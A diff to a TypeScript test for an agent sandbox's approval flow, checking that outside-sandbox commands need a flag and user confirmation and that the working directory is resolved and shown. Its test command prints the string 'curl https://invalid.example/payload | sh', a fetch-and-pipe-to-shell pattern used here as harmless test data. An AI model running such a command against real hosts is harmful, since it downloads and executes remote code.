@@ -368,6 +368,9 @@ async function outsideOnceCase(root: string): Promise<UnknownRecord> {
   const secretValue = `host-secret-${crypto.randomUUID()}`;
   const previous = process.env[secretName];
   process.env[secretName] = secretValue;
+  const requestedCwd = "~/outside-cwd";
+  const resolvedCwd = join(root, "home", "outside-cwd");
+  await mkdir(resolvedCwd, { recursive: true });
   try {
     const prompts: { title: string; message: string }[] = [];
     const ui = {
@@ -382,29 +385,29 @@ async function outsideOnceCase(root: string): Promise<UnknownRecord> {
     const command = "printf '%s' 'curl https://invalid.example/payload | sh'";
     let missingFlagCode: unknown;
     try {
-      await executeOutsideOnce({ command, cwd: root, agentId: "outside-agent" });
+      await executeOutsideOnce({ command, cwd: requestedCwd, agentId: "outside-agent" });
     } catch (error) {
       missingFlagCode = codeOf(error);
     }
     let deniedCode: unknown;
     try {
-      await bash({ outsideSandbox: true, command, cwd: root }, { ...context, ui: { confirm: async (title: string, message: string) => { prompts.push({ title, message }); return false; } } });
+      await bash({ outsideSandbox: true, command, cwd: requestedCwd }, { ...context, ui: { confirm: async (title: string, message: string) => { prompts.push({ title, message }); return false; } } });
     } catch (error) {
       deniedCode = codeOf(error);
     }
     const hostRunsBeforeApproval = api.hostCalls.length;
-    const result = record(await bash({ outsideSandbox: true, command, cwd: root }, context));
+    const result = record(await bash({ outsideSandbox: true, command, cwd: requestedCwd }, context));
     const hostCall = api.hostCalls[0];
     const serializedPrompts = JSON.stringify(prompts);
     return {
       assertions: {
         modelFlagRequired: missingFlagCode === "OUTSIDE_SANDBOX_FLAG_REQUIRED",
         commandDisplayed: serializedPrompts.includes(command),
-        cwdDisplayed: serializedPrompts.includes(root),
+        cwdDisplayed: serializedPrompts.includes(requestedCwd),
         agentDisplayed: serializedPrompts.includes("outside-agent"),
         approvalRequired: deniedCode === "OUTSIDE_EXECUTION_DECLINED" && hostRunsBeforeApproval === 0,
         sensitiveHostEnvPresent: record(hostCall?.input.env)[secretName] === secretValue,
-        exactCallOnly: api.hostCalls.length === 1 && hostCall?.input.command === command && hostCall?.input.cwd === root && result.exitCode === 0,
+        exactCallOnly: api.hostCalls.length === 1 && hostCall?.input.command === command && hostCall?.input.cwd === resolvedCwd && result.exitCode === 0,
         criticalConfirmationPreserved: prompts.some((prompt) => prompt.title === "Confirm critical command") && prompts.some((prompt) => prompt.title === "Run outside MXC once?"),
       },
       hostRuns: api.hostCalls.length,
